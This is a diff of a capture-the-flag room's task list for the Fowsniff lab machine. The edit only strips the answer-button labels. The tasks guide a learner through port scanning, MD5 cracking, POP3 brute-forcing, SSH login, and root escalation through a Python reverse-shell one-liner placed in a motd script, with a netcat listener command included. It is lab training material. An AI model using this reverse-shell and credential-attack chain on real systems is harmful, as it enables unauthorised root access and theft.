@@ -36,47 +36,47 @@ Credit to [berzerk0](https://twitter.com/berzerk0) for creating this machine.�
 ##### 
 Deploy the machine. On the top right of this you will see a **Deploy** button. Click on this to deploy the machine into the cloud. Wait a minute for it to become live.
 
-Correct Answer
+
 
 Using nmap, scan this machine. What ports are open?
 
-Correct Answer
+
 
 Using the information from the open ports. Look around. What can you find?
 
-Correct Answer
+
 
 Using Google, can you find any public information about them?
 
-Correct Answer
+
 
 Can you decode these md5 hashes? You can even use sites like [hashkiller](https://hashkiller.io/listmanager) to decode them.
 
-Correct Answer
+
 
 Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?
 
-Check
+
 
 What was seina's password to the email service?
 
-Check
+
 
 Can you connect to the pop3 service with her credentials? What email information can you gather?
 
-Check
+
 
 Looking through her emails, what was a temporary password set for her?
 
-Check
+
 
 In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.
 
-Check
+
 
 Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?
 
-Check
+
 
 Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?
 
@@ -86,23 +86,22 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 Other reverse shells: [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 
-Check
+
 
 If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in **/etc/update-motd.d/** file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!
 
-Check
+
 
 Start a netcat listener (nc -lvp 1234) and then re-login to the SSH service. You will then receive a reverse shell on your netcat session as root!
 
-Check
+
 
 If you are **really really** stuck, there is a brilliant walkthrough here: [https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/](https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/) **[](https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/)**
 
 If its easier, follow this walkthrough with the deployed machine on the site.
 
-Check
 
-## H
+
 <div align="center">
 <br>
 <br>
